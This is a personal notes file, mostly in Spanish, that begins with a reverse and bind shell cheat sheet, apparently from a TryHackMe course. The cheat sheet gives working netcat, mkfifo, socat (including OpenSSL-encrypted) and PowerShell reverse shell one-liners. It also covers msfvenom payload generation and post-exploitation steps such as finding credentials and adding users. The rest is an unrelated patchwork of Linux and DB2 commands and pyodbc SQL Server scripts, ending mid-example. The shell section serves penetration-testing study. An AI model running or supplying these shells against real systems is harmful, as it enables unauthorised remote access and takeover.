### Tabla de Herramientas Comunes

| Herramienta | Descripción | Ventajas | Desventajas |
| --- | --- | --- | --- |
| **Netcat (nc)** | La "navaja suiza" del networking. Permite realizar interacciones de red manuales, como banner grabbing, recibir shells inversas y conectar a puertos remotos. | Ampliamente disponible (generalmente preinstalado en Linux). | Shells muy inestables por defecto. |
| **Socat** | Similar a Netcat, pero con funcionalidades extendidas. | Shells más estables que Netcat por defecto. | Sintaxis más compleja. No suele estar preinstalado. |
| **Metasploit (multi/handler)** | Módulo de Metasploit para recibir shells inversas. | Proporciona una forma completa de obtener shells estables con muchas opciones para mejorar el shell capturado. Única forma de interactuar con shells Meterpreter y la forma más sencilla de manejar cargas por etapas. | Dependencia del framework Metasploit. |
| **Msfvenom** | Herramienta independiente de Metasploit para generar payloads (incluyendo shells inversas y de enlace). | Muy potente y versátil. | Requiere conocimiento detallado para su uso efectivo. |

### Otros recursos

- **Payloads all the Things:** Un repositorio de shells en varios lenguajes.
- **PentestMonkey Reverse Shell Cheatsheet:** Una hoja de trucos comúnmente utilizada.
- **/usr/share/webshells (Kali Linux):** Contiene una variedad de webshells preinstaladas.
- **SecLists repo:** Principalmente para wordlists, pero también contiene código útil para obtener shells.

## Shells Inversas vs. Shells de Enlace

- **Shells Inversas:** El objetivo ejecuta código que se conecta a tu máquina. Requiere un "listener" en tu máquina para recibir la conexión. Útil para evitar firewalls que bloquean conexiones entrantes al objetivo. Requiere configuración de red en tu máquina si el objetivo está en internet (no aplica en TryHackMe).
- **Shells de Enlace:** El objetivo ejecuta código que abre un "listener" en un puerto. Te conectas a ese puerto desde tu máquina para obtener acceso. No requiere configuración en tu red, pero puede ser bloqueado por firewalls en el objetivo.

**En general, las shells inversas son más fáciles de ejecutar y depurar.**

### Ejemplo de Shell Inversa

**Atacante (Listener):**

```bash
sudo nc -lvnp 443

```

**Objetivo (Ejecuta el código):**

```bash
nc <IP-DEL-ATACANTE> <PUERTO> -e /bin/bash

```

Tras ejecutar el comando en el objetivo, el listener en la máquina del atacante recibe una conexión. Al ejecutar comandos, se ejecutan como el usuario en el sistema objetivo.

### Ejemplo de Shell de Enlace

**Objetivo (Listener):**

```bash
nc -lvnp <puerto> -e "cmd.exe"

```

**Atacante (Conexión):**

```bash
nc <IP-DEL-OBJETIVO> <puerto>

```

Esto también proporciona ejecución de código en la máquina remota.

## Interacción del Shell: Interactivos vs No Interactivos

- **Interactivos:** Permiten interactuar con programas después de ejecutarlos. Ejemplo: el prompt de login de SSH.
- **No Interactivos:** Limitan el uso a programas que no requieren interacción del usuario. La mayoría de las shells inversas y de enlace simples son no interactivas.

```
# Ejemplo:
whoami # Funciona bien en un shell no interactivo
ssh user@host # No funciona en un shell no interactivo

```

## Listener Alias

En las demostraciones, es posible que veas un comando llamado `listener`. Este es un alias configurado en la máquina de ataque para simplificar la escritura de `sudo rlwrap nc -lvnp 443`. No funcionará en otras máquinas a menos que configures el alias localmente.

## Netcat para Shells

Netcat es una herramienta fundamental para el manejo de shells.

### Shells Inversas con Netcat

Para iniciar un listener de Netcat:

```bash
nc -lvnp <número-de-puerto>

```

- `l`: Indica que Netcat actuará como listener.
- `v`: Activa la salida verbose.
- `n`: Evita la resolución de nombres de host (no usa DNS).
- `p`: Especifica el puerto a escuchar.

Ejemplo:

```bash
sudo nc -lvnp 443

```

### Shells de Enlace con Netcat

Para conectarse a un puerto en escucha en el objetivo:

```bash
nc <IP-del-objetivo> <puerto-elegido>

```

## Estabilizando Shells de Netcat

Las shells de Netcat son inestables por defecto.  Existen varias técnicas para estabilizar las shells de Netcat en sistemas Linux. La estabilización de shells inversas en Windows es significativamente más difícil; sin embargo, la segunda técnica cubierta aquí es particularmente útil para ello.

### Técnica 1: Python

Aplicable solo a Linux (Python preinstalado).

1. Usar Python para generar un shell de bash mejorado:
    
    ```bash
    python -c 'import pty;pty.spawn("/bin/bash")'
    
    ```
    
    (Puede ser necesario especificar la versión: `python2` o `python3`).
    
2. Exportar la variable de entorno TERM:
    
    ```bash
    export TERM=xterm
    
    ```
    
3. Enviar el shell a segundo plano y estabilizarlo:
    
    ```bash
    Ctrl + Z
    stty raw -echo; fg
    
    ```
    

Si el shell muere, escribe `reset` y presiona Enter para restaurar la visibilidad en la terminal.

### Técnica 2: rlwrap

Proporciona historial, autocompletado y teclas de flecha al recibir el shell.

1. Instalar `rlwrap` (si no está instalado):
    
    ```bash
    sudo apt install rlwrap
    
    ```
    
2. Iniciar el listener con `rlwrap`:
    
    ```bash
    rlwrap nc -lvnp <puerto>
    
    ```
    

Para estabilizar completamente en Linux, usa la misma técnica que en el paso 3 de la técnica anterior (Ctrl+Z, `stty raw -echo; fg`).

### Técnica 3: Socat

Utilizar un shell de Netcat inicial como un "stepping stone" para un shell de Socat más completo.  Limitado a objetivos Linux.

1. Transferir un binario de Socat compilado estáticamente al objetivo. Se puede utilizar un servidor web en la máquina del atacante:
    
    ```bash
    sudo python3 -m http.server 80
    
    ```
    
2. En el objetivo (usando el shell de Netcat), descargar el binario:
    
    ```bash
    wget <IP-DEL-ATACANTE>/socat -O /tmp/socat
    
    ```
    
    (En Windows/Powershell usar `Invoke-WebRequest -uri <IP-DEL-ATACANTE>/socat.exe -outfile C:\\\\Windows\\temp\\socat.exe`)
    

## Cambiando el Tamaño de la Terminal (tty)

Útil para usar editores de texto en shells remotos.

1. En una terminal local, ejecutar:
    
    ```bash
    stty -a
    
    ```
    
2. Anotar los valores de "rows" y "columns".
3. En el shell remoto, ejecutar:
    
    ```bash
    stty rows <número-de-filas>
    stty cols <número-de-columnas>
    
    ```
    

Esto ajustará el tamaño de la terminal registrado y permitirá que los programas funcionen correctamente.

# Socat

Socat es una herramienta similar a Netcat pero con funcionalidades más avanzadas. Se utiliza como conector entre dos puntos, como un puerto de escucha y el teclado. Socat permite crear shells reversas y bind tanto en Linux como en Windows, y puede generar shells cifradas utilizando OpenSSL.

**Usos clave de Socat:**

- **Shells reversas y bind:** Socat permite crear shells reversas y bind en Linux y Windows.
- **Shells cifradas:** Utiliza OpenSSL para crear shells cifradas, evitando el espionaje y eludir sistemas de detección de intrusos (IDS).
- **Estabilidad:** Ofrece una shell tty reversa estable en Linux, permitiendo interactividad completa.

**Comandos básicos con ejemplos:**

1. **Listener reversa básico en Linux:**
    
    ```bash
    socat TCP-L:8080 -
    
    ```
    
    En el objetivo (Windows):
    
    ```bash
    socat TCP::8080 EXEC:powershell.exe,pipes
    
    ```
    
2. **Shell tty reversa estable en Linux:**
    
    ```bash
    socat TCP-L:8080 FILE:`tty`,raw,echo=0
    
    ```
    
    En el objetivo (Linux):
    
    ```bash
    socat TCP::8080 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
    
    ```
    
3. **Conexión cifrada con OpenSSL:**
    - Generar certificado:
        
        ```bash
        openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
        cat shell.key shell.crt > shell.pem
        
        ```
        
    - Listener cifrado en Linux:
        
        ```bash
        socat OPENSSL-LISTEN:8080,cert=shell.pem,verify=0 -
        
        ```
        
    - Conexión desde el objetivo (Linux):
        
        ```bash
        socat OPENSSL::8080,verify=0 EXEC:/bin/bash
        
        ```
        

**Payloads comunes**

Pronto veremos cómo generar payloads con msfvenom, pero antes, vamos a revisar algunos payloads comunes utilizando las herramientas que ya hemos cubierto.

### Netcat

En algunas versiones de netcat (como la de Windows incluida en Kali), existe una opción `-e` que permite ejecutar un proceso al conectarse. Por ejemplo, como oyente:

```
nc -lvnp <PUERTO> -e /bin/bash

```

Esto generaría un **bind shell** en el objetivo. Para un **reverse shell**, usaríamos:

```
nc <IP-LOCAL> <PUERTO> -e /bin/bash

```

Sin embargo, esta opción no está disponible en todas las versiones de netcat debido a problemas de seguridad. En Linux, para crear un **bind shell**, usaríamos:

```
mkfifo /tmp/f; nc -lvnp <PUERTO> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

```

Este comando crea un pipe y conecta la entrada y salida entre el oyente de netcat y un shell. Un comando similar para un **reverse shell** sería:

```
mkfifo /tmp/f; nc <IP-LOCAL> <PUERTO> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

```

### Reverse Shell en Powershell

En servidores Windows modernos, es común usar un **reverse shell** de Powershell. Este es un ejemplo de comando:

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<puerto>); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()"

```

Para usarlo, solo hay que reemplazar `<IP>` y `<PUERTO>` por los valores correspondientes.

### MsFvenom

**Msfvenom** es una herramienta parte del framework Metasploit que se usa para generar código de payloads, principalmente para **reverse** y **bind shells**. Su sintaxis básica es:

```
msfvenom -p <PAYLOAD> <OPCIONES>

```

Por ejemplo, para generar un reverse shell de Windows x64 en formato `.exe`, usaríamos:

```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<IP-escucha> LPORT=<puerto-escucha>

```

Algunas de las opciones más comunes:

- `f <formato>`: Define el formato de salida (ej. exe).
- `o <archivo>`: El archivo de salida.
- `LHOST=<IP>`: La IP de escucha.
- `LPORT=<puerto>`: El puerto de escucha.

### Staged vs Stageless

- **Staged**: El payload se envía en dos partes: un **stager** que carga el código real del reverse shell. Requiere un oyente especial, como el **multi/handler** de Metasploit.
- **Stageless**: Es un payload autónomo, que se ejecuta y envía un shell inmediatamente al oyente sin necesidad de un stager. Es más fácil de detectar pero más sencillo de usar.

### Meterpreter

**Meterpreter** es un shell de Metasploit, con muchas funciones avanzadas, como carga y descarga de archivos. Para usar herramientas de post-explotación, es necesario tener un shell Meterpreter.

### Convenciones de nombres en msfvenom

La convención básica para los payloads es:

```
<Sistema operativo>/<arquitectura>/<payload>

```

Ejemplo:

```
linux/x86/shell_reverse_tcp

```

En objetivos Windows de 32 bits, no se especifica la arquitectura, por ejemplo:

```
windows/shell_reverse_tcp

```

Para sistemas de 64 bits, se especifica la arquitectura, como:

```
windows/x64/meterpreter/reverse_tcp

```

Es útil saber que puedes listar todos los payloads disponibles con:


msfvenom --list payloads
# Resumen Final: Reverse y Bind Shells (Con Roles Atacante/Objetivo)

Este documento resume los conceptos y técnicas esenciales para obtener acceso remoto a sistemas a través de reverse y bind shells. Cubre las herramientas, los tipos de shells, la estabilización, la encriptación, la generación de payloads y los pasos a seguir una vez obtenido un shell inicial. Se especifica claramente el rol del atacante y del objetivo en cada tipo de shell.

## 1. ¿Qué es un Shell? Herramientas

*   **Shell:** Interfaz para interactuar remotamente con un sistema.
*   **Netcat:** Herramienta versátil para interacciones de red.
*   **Socat:** Una versión más potente de Netcat.
*   **Metasploit (multi/handler):** Un módulo de Metasploit para recibir reverse shells.
*   **Msfvenom:** Una herramienta para generar payloads.
*   **Recursos Adicionales:** Repositorios de shells.

## 2. Tipos de Shells y Roles

| Tipo de Shell  | Atacante                                                                                                    | Objetivo                                                                                                                     |
|-----------------|-------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------|
| Reverse Shell   | Inicia un listener, espera la conexión del objetivo. Recibe la shell.                                     | Ejecuta código malicioso que se conecta al listener del atacante. Envía la shell.                                           |
| Bind Shell      | Se conecta a un puerto abierto en el objetivo. Controla la shell que se ejecuta en el sistema del objetivo. | Ejecuta código malicioso que abre un puerto y crea un listener. Espera la conexión del atacante. Proporciona la shell. |

## 3. Netcat

*   Herramienta fundamental para networking.
*   **Reverse Shells (Netcat Listener):**
    *   Atacante: Ejecuta: `nc -lvnp <port-number>`
    *   Objetivo: Ejecuta: `nc <attacker-ip> <port> -e /bin/bash`
*   **Bind Shells (Conexión con Netcat):**
    *   Atacante: Ejecuta: `nc <target-ip> <chosen-port>`
    *   Objetivo: Ya tiene un listener corriendo (previamente comprometido o configurado).

## 4. Estabilización de Shells de Netcat

*   Los shells de Netcat son inestables por defecto.
*   **Técnica 1: Python (Linux):**
    *   Objetivo: Ejecuta: `python -c 'import pty;pty.spawn("/bin/bash")'`
    *   Atacante: Ctrl+Z, luego `stty raw -echo; fg`.
*   **Técnica 2: rlwrap:**
    *   Atacante: Ejecuta: `rlwrap nc -lvnp <port>`
*   **Técnica 3: Socat (Linux):**
    *   Transferir un binario Socat compilado estáticamente al objetivo.
*   **Cambiar el tamaño de la TTY:** Objetivo (en el shell comprometido):  `stty rows <number>` y `stty cols <number>` (después de obtener los valores de `stty -a` en el terminal del atacante).

## 5. Socat

*   Un conector entre dos puntos.
*   **Reverse Shells:**
    *   Atacante (Listener): `socat TCP-L:<port> -`
    *   Objetivo (Conexión): `socat TCP:<attacker-ip>:<LOCAL-PORT> EXEC:"bash -li"`
*   **Bind Shells:**
    *   Objetivo (Listener): `socat TCP-L:<PORT> EXEC:"bash -li"`
    *   Atacante (Conexión): `socat TCP:<TARGET-IP>:<TARGET-PORT> -`
*   **Shell TTY Estable (Linux):**
    *   Atacante (Listener): `socat TCP-L:<port> FILE:\\`tty\\`,raw,echo=0`
    *   Objetivo (Conexión): `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

## 6. Shells Encriptados con Socat, Payloads Comunes y msfvenom

*   **Shells Encriptados con Socat:**
    *   Requieren certificados. (Generación en el lado del Atacante)
    *   Atacante (Listener): `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
    *   Objetivo (Conexión): `socat OPENSSL:<attacker-ip>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
*   **Payloads Comunes:** Ver ejemplos en el resumen original.
*   **msfvenom:** Ver ejemplos en el resumen original.
*   **Staged vs Stageless Payloads:** Ver ejemplos en el resumen original.

## 7. Meterpreter y Convenciones de Nomenclatura de Payloads

*   **Meterpreter:** Shells de Metasploit, completamente estables.
*   **Convenciones de Nomenclatura de Payloads (msfvenom):** Ver ejemplos en el resumen original.
*   **Listar Payloads (msfvenom):** `msfvenom --list payloads | grep "..."`

## 8. Metasploit Multi/Handler

*   Esencial para Meterpreter y payloads staged.
*   Atacante:
    1.  `msfconsole`
    2.  `use multi/handler`
    3.  `options`
    4.  `set PAYLOAD <payload>`, `set LHOST <listen-address>`, `set LPORT <listen-port>`
    5.  `exploit -j`

## 9. Webshells

*   Scripts que se ejecutan dentro de un servidor web para ejecutar comandos.
*   Atacante: Envía peticiones al servidor web.
*   Objetivo: Proporciona una interfaz web para ejecutar comandos.

## 10. Siguientes Pasos

*   Los reverse/bind shells son solo el primer paso. No son tan robustos como los shells nativos.
*   **Objetivo (Linux):** Buscar credenciales SSH, explotar vulnerabilidades para agregar un usuario.
*   **Objetivo (Windows):** Buscar contraseñas de servicios en el registro, obtener un shell como SYSTEM o Administrador para agregar un nuevo usuario.
*   Intentar usar un método nativo (SSH, RDP, etc.) para acceder a la máquina.

//////////////////////////////////////////////////////////////////////

Resumen de Herramientas por Fase

1. Reconocimiento:
    - Nmap (nmap -p- -Pn -sV -T5 $TARGET)
    - Modificación de `/etc/hosts` (echo “ip webname.com” | tee a /etc/hosts)
2. Escaneo y Enumeración:
    - Análisis del sitio web (parámetros vulnerables)
    - whatweb
3. Obtención de Acceso Inicial:
    - Explotación de LFI
    - Responder
4. Escalada de Privilegios:
    - John the Ripper
    - john -w=/usr/share/wordlists/rockyou.txt hash_found.txt
5. Movimiento Lateral y Acceso al Sistema:
    - Evil-WinRM evil-winrm -i $TARGET -u administrator -p badminton
6. Post-Explotación:
    - Navegación por el sistema de archivos (comandos de Windows)
  
/////////////////////////////////////////////////////////////////////

# Print working directory
pwd

# Open directory
open /Users/renek/

# List items within a directory
ls 

#Change directory
cd Movies

# Move one level up in the directory
cd ..

# Navigate to home directory ( alt + ñ )
cd ~ 

# Clear screen
clear

# Create a file
touch sample_one.txt

# Create a folder/directory
mkdir sample_two.txt


# Delete folder and it content
rm -r sample_folder

# Open a file
open sample_one.txt 
nano sample.txt 



https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/sistemas-basicos/linux


# List files and directories in the current directory
ls

# Listing items with various options
ls -ltr
ls -l  # Long format listing, showing file permissions, owner, group, size, and modification time
ls -a  # Show all files, including hidden files (those starting with a dot)
ls -R  # Recursively list subdirectories
ls -1  # One file per line
ls -m  # Comma-separated output
ls -S  # Sort by file size
ls -t  # Sort by modification time
ls -r  # Reverse the sort order
ls --sort=size
ls --sort=time
ls -F  # Append indicator (one of */=>@|) to entries
ls --color=auto  # Colorize the output
ls -h  # Print sizes in human-readable format (e.g., 1.2M instead of 1234567)
ls -c  # Use time of file creation for sorting/listing
ls -u  # Use time of last access for sorting/listing
ls -d  # List directories themselves, not their contents
ls -i  # Print the index number of each file
ls -n  # List numeric UIDs and GIDs instead of names
ls -p  # Append a slash (/) to directory entries

# Count the number of items in the current directory
ls | wc -l

# Show the current working directory
pwd

# Change directory
cd /path/to/directory

# Move to the previous directory
cd ..

# Create a new directory
mkdir new_directory

# Create a new empty file
touch new_file.txt

# Copy files or directories
cp source_file.txt destination_file.txt

# Move or rename files or directories
mv source_file.txt new_name.txt

# Delete files or directories
rm file_to_delete.txt

# Display the contents of a file
cat file.txt

# Display the first lines of a file
head file.txt

# Display the last lines of a file
tail file.txt

# View paginated file content
less file.txt

# Display running processes
ps

# Terminate processes
kill 1234

# Show available disk space
df -h

# Show disk space usage of files and directories
du -h --max-depth=1 /path/to/directory

# Compress and decompress files and directories
tar -czvf archive.tar.gz directory

# Change file and directory permissions
chmod 755 file.txt

# Change file and directory owner
chown user:group file.txt

# Run commands with superuser privileges
sudo command

# Manage packages on Debian-based systems (or other distributions)
sudo apt-get install package_name

# Update the package list
sudo apt-get update

# Download files from the web
wget http://example.com/file.zip

# Connect to a remote server via SSH
ssh user@server

# Securely copy files between systems via SSH
scp file.txt user@server:/path/to/destination

# Show all system users
cat /etc/passwd

# Extract only the username from passwd
cut -d: -f1 /etc/passwd

# Show only human users
awk -F: '$3 >= 1000 && $3 < 65534 {print $1}' /etc/passwd

# Information about users and services
getent passwd

# Search patterns in text files
grep "pattern" file.txt

# Search files and directories
find /path -name "filename"

# See the type of a document
file document.txt

# Show real-time system information
top

# Reboot the server
reboot

# Information about the last system boot time
who -b 

# Display information about the users currently logged into the system
who -a

# Extended CPU information
lscpu -e

# System memory usage
du -bhsc *

# Check swap memory
swapon -s

# RAM usage
free -h

# CPU usage
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head

# Database status for DB2
ps -ef | grep db2sysc

# Hardware information
lscpu

# Disk usage by directory
du -sh /path/to/directory

# List connected users
w
who

# Calculate the disk usage of a directory and its immediate contents
du -h --max-depth=1
du -h --max-depth=1 /path/to/directory

# View paginated file content
less example_file.log

# Move through the file using 'less'
# Move forward one line: Down Arrow, Enter, e, or j
# Move backward one line: Up Arrow, y, or k
# Move forward one page: Space bar or Page Down
# Move backward one page: Page Up or b
# Scroll right: Right Arrow
# Scroll left: Left Arrow
# Jump to top of file: Home or g
# Jump to end of file: End or G
# Jump to a specific line: Type the line number and then hit "g"
# Jump to a percentage through the file: Type the percentage and then hit "p" or "%"

# Searching within 'less'
# Search forward: Hit "/" and type your search, then press Enter
# Search backward: Hit "?" and type your search, then press Enter
# Go to next matching search item: n
# Go to previous matching search item: N

# Display the last 1000 lines of a file
tail -n 1000 filename.txt 

# Display the total number of lines and then print the last 1000 lines
sed -n -e '$=' filename.txt | sed -e '1,1000p'

# Open the file in 'less' and show the last 1000 lines
less +F filename.txt 

# Display the contents of the filesystem table
cat /etc/fstab

# Mount all filesystems defined in /etc/fstab
mount -a


///////////////////////////////////////////////////////////

DB2

# Memoria por Base de Datos
db2pd -dbptnmem
db2pd -db

# Listar utulidades
db2 list utilities show detail

# Comprobar si db2 está levantado
ps -ef | grep db2sysc
ps -eo pid,lstart,cmd | grep db2sysc | awk '{print "DB2 está levantado desde:", $3, $4, $5, $6, $7}'


# Conexión a la Instancia de Bases de Datos
su - <usuario_instancia> # Nota: Para averiguar el usuario, usar `ps -ef | grep db2` o ir a `cd /home`. El usuario de DB2 que gestiona la instancia será aquel que tenga la carpeta `sqllib` en su directorio `/home`.

# Conexión a una Base de Datos
db2 connect to <database>

# Directorio de Bases de Datos
db2 list database directory

# Bases de Datos Activas
db2 list active databases

# Activar/Desactivar Bases de Datos
db2 activate db <database>
db2 deactivate db <database>
db2 terminate db <database>

# Activar una Base de Datos
db2 activate db <dbname> # Nota: Es importante ejecutar este comando al realizar una conexión. Si no se activa la base de datos manualmente, DB2 la activará automáticamente, lo que puede impactar en la respuesta de la query/conexión. Siempre se debe activar la base de datos, haya o no conexiones a la misma.

# Eliminar una Sesión
db2 kill <spid>


///////////////////////////////////////////////

# Python

```python
# TODO: Retrieve a list of all servers within our Organizational Unit (OU)
# TODO: From this list, create a subset of all cluster objects
# TODO: Create a separate subset from the remaining servers

# Expected lists:
#   - All servers in the OU
#   - Cluster objects
#   - Remaining servers

# TODO: Retrieve servers that are already tracked and saved in the database
# TODO: Compare the list of remaining servers with the tracked servers to identify untracked servers
# TODO: Add the untracked list of servers to the database
# TODO: Complete the necessary data fields and generate an INSERT statement for database entry

# VARs
# Variable suggestions for each step:

# For the list of all servers in the Organizational Unit (OU)
# all_servers_in_ou
# servers_in_ou
# ou_servers
# ou_server_list
# all_ou_servers
# ou_server_inventory

# For the list of cluster objects
# cluster_servers
# cluster_objects
# cluster_server_list
# clusters_in_ou
# ou_clusters
# cluster_inventory

# For the list of remaining servers (excluding clusters)
# remaining_servers
# non_cluster_servers
# standalone_servers
# remaining_server_list
# ou_non_clustered_servers
# unclustered_servers

# For servers already tracked in the database
# tracked_servers
# db_tracked_servers
# existing_servers_in_db
# saved_servers
# tracked_server_list
# database_tracked_servers

# For the list of untracked servers
# untracked_servers
# new_servers_to_track
# servers_to_add_to_db
# unregistered_servers
# untracked_server_list
# untagged_servers

# For the database insert statement
# insert_statement
# insert_query
# db_insert_command
# server_insert_statement
# add_untracked_servers_query
# insert_new_servers
```

Pasos para Conectarse a una Instancia de SQL Server Usando Python:

1. Importación de Bibliotecas:
    - Importar la biblioteca necesaria (pyodbc) para establecer la conexión y ejecutar consultas SQL.
2. Definición de Parámetros de Conexión:
    - Especificar los parámetros de conexión, como el controlador de SQL Server, el nombre del servidor, la base de datos y las credenciales.
    - Configurar opciones adicionales, como la autenticación (conexión confiable o con usuario y contraseña).
3. Establecimiento de la Conexión:
    - Utilizar la función de conexión proporcionada por la biblioteca (pyodbc.connect()) con la cadena de conexión definida.
    - Manejar posibles excepciones que puedan ocurrir durante el intento de conexión.
4. Creación de un Cursor:
    - Crear un objeto cursor a partir de la conexión establecida.
    - El cursor permite ejecutar comandos SQL y recuperar resultados de las consultas.
5. Ejecución de Consultas SQL:
    - Utilizar el cursor para ejecutar consultas SQL que devuelvan información de interés (ejemplo: versión de SQL Server, lista de bases de datos).
    - Recuperar los resultados de las consultas utilizando métodos como fetchone() o fetchall().
6. Procesamiento de Resultados:
    - Procesar los datos obtenidos de las consultas para extraer la información necesaria (como nombre de la base de datos, versión del servidor).
    - Manejar casos especiales, como la ausencia de resultados o errores en las consultas.
7. Cierre de la Conexión:
    - Asegurarse de cerrar el cursor y la conexión a la base de datos una vez completadas todas las operaciones.
    - Esto libera los recursos utilizados y previene posibles fugas de memoria.
8. Manejo de Excepciones (opcional):
    - Implementar un manejo de excepciones para capturar y gestionar cualquier error que pueda ocurrir durante la conexión o ejecución de consultas.

- ~~Review disabled/enabled jobs in all servers~~
- Add sp_who to all servers
- ~~Update table responsible contacts~~
- Change function to get user’s email
- Organize and rename files and folders
- Modules to perform different tasks

echo "# python_db_management" >> [README.md](http://readme.md/)
git init
git add [README.md](http://readme.md/)
git commit -m "first commit"
git branch -M main
git remote add origin [https://github.com/renekerr/python_db_management.git](https://github.com/renekerr/python_db_management.git)
git push -u origin main

### …or push an existing repository from the command line

```
git remote add origin https://github.com/renekerr/python_db_management.gitgit branch -M main
git push -u origin main
```

Connecting to several SQL Server instances and executing queries in a modularized way involves creating reusable functions for establishing connections, executing queries, and handling results. Below is an example using Python with the pyodbc library, which is a common choice for interacting with SQL Server.

First, ensure you have the pyodbc library installed:

pip install pyodbc

Here’s the Python code with a modularized structure:

import pyodbc

def create_connection(server, database, username, password):
"""
Create a database connection to a SQL Server instance.

```python
:param server: SQL Server address
:param database: Database name
:param username: Username
:param password: Password
:return: Connection object or None
"""
try:
    connection_string = (
        f"DRIVER={{ODBC Driver 17 for SQL Server}};"
        f"SERVER={server};"
        f"DATABASE={database};"
        f"UID={username};"
        f"PWD={password}"
    )
    connection = pyodbc.connect(connection_string)
    print(f"Connection to {server} successful")
    return connection
except pyodbc.Error as e:
    print(f"Error connecting to {server}: {e}")
    return None

```

def execute_query(connection, query):
"""
Execute a query on the connected database.

```python
:param connection: Connection object
:param query: SQL query string
:return: Query result or None
"""
try:
    cursor = connection.cursor()
    cursor.execute(query)
    result = cursor.fetchall()
    print(f"Query executed successfully: {query}")
    return result
except pyodbc.Error as e:
    print(f"Error executing query: {e}")
    return None

```

def close_connection(connection):
"""
Close the database connection.

```python
:param connection: Connection object
"""
try:
    connection.close()
    print("Connection closed")
except pyodbc.Error as e

```

A SQL Server DBA (Database Administrator) can leverage Python to perform a wide range of tasks. Here are some specific examples:

```
1.	Database Connection and Query Execution:
•	Use libraries like pyodbc, pymssql, or sqlalchemy to connect to SQL Server databases and execute queries.
•	Automate routine queries, such as monitoring database health or retrieving reports.
2.	Backup and Restore Operations:
•	Write scripts to automate backup and restore processes using T-SQL commands executed via Python.
•	Schedule these scripts to run at specified intervals using a task scheduler.
3.	Database Monitoring and Alerts:
•	Monitor database performance metrics (e.g., CPU usage, memory usage, I/O stats) and set up alerts for thresholds using Python scripts.
•	Integrate with monitoring tools or services to send notifications (e.g., email, SMS) when certain conditions are met.
4.	Data Migration and ETL Processes:
•	Perform data extraction, transformation, and loading (ETL) using libraries like pandas for data manipulation.
•	Automate data migration tasks between different databases or servers.
5.	Database Maintenance:
•	Automate maintenance tasks such as index rebuilding, statistics updates, and database integrity checks.
•	Schedule maintenance scripts to run during off-peak hours.
6.	Log Analysis and Reporting:
•	Parse and analyze SQL Server logs to identify errors or performance issues.
•	Generate reports from log data and send them via email or save them to a file.
7.	Database Security and User Management:
•	Automate the creation and management of database users and roles.
•	Monitor and enforce security policies by scripting checks for unauthorized access or configuration changes.
8.	Database Schema Changes:
•	Use Python to manage and deploy database schema changes in a controlled and automated manner.
•	Track schema changes using version control systems integrated with Python scripts.
9.	Data Analysis and Visualization:
•	Perform data analysis directly on SQL Server data using Python’s data analysis libraries.
•	Create visualizations with libraries like matplotlib or seaborn and embed them in reports.
10.	Integration with Other Tools:
•	Integrate SQL Server with other systems and applications (e.g., web services, APIs) using Python.
•	Automate workflows that involve multiple systems.

```

Here is a simple example of a Python script using pyodbc to connect to a SQL Server database, execute a query, and print the results:

import pyodbc

# Define connection parameters

server = 'your_server'
database = 'your_database'
username = 'your_username'
password = 'your_password'

# Establish the connection

conn = pyodbc.connect(f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={server};DATABASE={database};UID={username};PWD={password}')

# Create a cursor object

cursor = conn.cursor()

# Define a SQL query

query = "SELECT TOP 10 * FROM your_table"

# Execute the query

cursor.execute(query)

# Fetch and print the results

rows = cursor.fetchall()
for row in rows:
print(row)

# Close the connection

cursor.close()
conn.close()

This script demonstrates connecting to a SQL Server database, executing a query, and fetching the results. Similar scripts can be extended to include more complex logic for various DBA tasks.

---

---

---

---

To connect to a remote SQL Server and launch a PowerShell command using Python, you can use the following approach:

```
1.	Connect to the Remote SQL Server: Utilize libraries such as pyodbc or pymssql to establish a connection to the SQL Server.
2.	Launch PowerShell Commands: Use the subprocess module to execute PowerShell commands from Python.

```

Here’s a step-by-step example demonstrating how to achieve this:

Step 1: Connect to the Remote SQL Server

First, you’ll need to establish a connection to your remote SQL Server using pyodbc.

import pyodbc

# Define connection parameters

server = 'your_remote_server'
database = 'your_database'
username = 'your_username'
password = 'your_password'

# Establish the connection

conn = pyodbc.connect(f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={server};DATABASE={database};UID={username};PWD={password}')

# Create a cursor object

cursor = conn.cursor()

# Define a SQL query

query = "SELECT TOP 10 * FROM your_table"

# Execute the query

cursor.execute(query)

# Fetch and print the results

rows = cursor.fetchall()
for row in rows:
print(row)

# Close the connection

cursor.close()
conn.close()

Step 2: Launch PowerShell Command

To launch a PowerShell command, you can use the subprocess module. Here’s an example of how to run a simple PowerShell command from Python:

import subprocess

# Define the PowerShell command

powershell_command = 'Get-Process'

# Execute the PowerShell command

result = subprocess.run(['powershell', '-Command', powershell_command], capture_output=True, text=True)

# Print the output of the command

print(result.stdout)

Combining Both Steps

To combine both steps, you might want to execute a PowerShell command after performing some operations on the SQL Server. Here’s a full example:

import pyodbc
import subprocess

# Define connection parameters

server = 'your_remote_server'
database = 'your_database'
username = 'your_username'
password = 'your_password'

# Establish the connection

conn = pyodbc.connect(f'DRIVER={{ODBC Driver 17 for SQL Server}};SERVER={server};DATABASE={database};UID={username};PWD={password}')

# Create a cursor object

cursor = conn.cursor()

# Define a SQL query

query = "SELECT TOP 10 * FROM your_table"

# Execute the query

cursor.execute(query)

# Fetch and print the results

rows = cursor.fetchall()
for row in rows:
print(row)

# Close the connection

cursor.close()
conn.close()

# Define the PowerShell command

powershell_command = 'Get-Process'

# Execute the PowerShell command

